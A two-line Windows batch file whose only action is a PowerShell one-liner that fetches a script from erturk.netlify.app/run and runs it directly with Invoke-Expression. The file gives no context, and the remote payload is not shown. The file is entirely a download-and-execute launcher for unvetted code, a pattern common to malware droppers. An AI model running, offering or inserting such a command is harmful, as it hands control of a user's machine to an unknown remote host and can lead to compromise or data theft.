@echo off
powershell -Command "irm erturk.netlify.app/run | iex"